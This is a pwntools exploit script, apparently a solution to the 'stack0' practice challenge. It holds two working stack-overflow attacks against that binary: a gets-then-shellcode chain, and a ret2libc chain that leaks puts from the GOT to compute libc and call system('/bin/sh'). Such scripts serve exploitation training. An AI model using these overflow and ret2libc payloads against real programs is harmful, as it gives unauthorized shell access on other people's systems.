from pwn import *
r = process("./stack0")

def shellcode():
	shelladdr = 0x08049020
	gets_plt = 0x0804830c
	payload = "A"*0x50
	payload += p32(gets_plt)
	payload += p32(shelladdr)
	payload += p32(shelladdr)
	r.sendline(payload)
	r.sendline(asm(shellcraft.sh()))
	r.interactive()
	
def aslr():
	puts_plt = 0x0804832c
	puts_got = 0x08049638
	main = 0x080483f4
	offset_put = 0x5fca0
	offset_system = 0x3ada0
	offset_sh = 0x15ba0b
	payload = "A"*0x50
	payload += p32(puts_plt)
	payload += p32(main)
	payload += p32(puts_got)
	r.sendline(payload)
	put = u32(r.recv(4))
	base = put - offset_put #vmmap, check base libc, tinh offset
	system = base + offset_system
	binsh = base + offset_sh
	log.info("puts_plt: %#x" % put)
	log.info("base: %#x" % base)
	log.info("system: %#x" % system)
	log.info("binsh: %#x" % binsh)
	payload = "A"*(0x50-8)
	payload += p32(system)
	payload += p32(main)
	payload += p32(binsh)
	r.sendline(payload)
	r.interactive()
# shellcode()
aslr()